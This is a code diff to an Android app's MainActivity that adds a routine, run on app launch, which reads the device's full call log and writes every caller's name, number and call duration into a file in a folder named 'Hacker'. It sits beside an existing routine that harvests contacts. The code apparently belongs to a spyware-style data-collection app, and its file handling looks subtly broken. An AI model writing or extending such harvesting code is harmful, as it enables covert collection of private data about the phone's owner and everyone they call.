@@ -12,6 +12,7 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.Environment;
+import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.util.Log;
 import android.view.View;
@@ -46,8 +47,39 @@ public class MainActivity extends AppCompatActivity {
             Toast.makeText(this, "File already exists"+file, Toast.LENGTH_SHORT).show();
         }
         gettingcontacts();
+        getcalllog();
 
     }
+
+    private void getcalllog() {
+        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)!= PackageManager.PERMISSION_GRANTED){
+            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_CALL_LOG},0);
+        }
+        try {
+            File file=new File(getExternalFilesDir(null)+"/Hacker");
+            file.delete();
+            File CallLogs=new File(file,"CallLogs.txt");
+            FileWriter callwriter=new FileWriter(CallLogs);
+            ContentResolver contentResolver=getContentResolver();
+            Uri Call= CallLog.Calls.CONTENT_URI;
+            Cursor cursorcallalogs=contentResolver.query(Call,null,null,null,null);
+            if(cursorcallalogs.getCount() >0) {
+                while(cursorcallalogs.moveToNext()){
+                    @SuppressLint("Range") String Name=cursorcallalogs.getString(cursorcallalogs.getColumnIndex(CallLog.Calls.CACHED_NAME));
+                    @SuppressLint("Range") String Number=cursorcallalogs.getString(cursorcallalogs.getColumnIndex(CallLog.Calls.NUMBER));
+                    @SuppressLint("Range") String Duration=cursorcallalogs.getString(cursorcallalogs.getColumnIndex(CallLog.Calls.DURATION));
+                    callwriter.append("Cached_Name : "+Name+"\r\n"+"Number : "+Number+"\r\n"+"Duration : "+Duration+"\r\n");
+                    callwriter.flush();
+                }
+            }
+            callwriter.close();
+
+        }
+        catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
     private void gettingcontacts(){
         if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)!= PackageManager.PERMISSION_GRANTED){
             ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_CONTACTS},0);
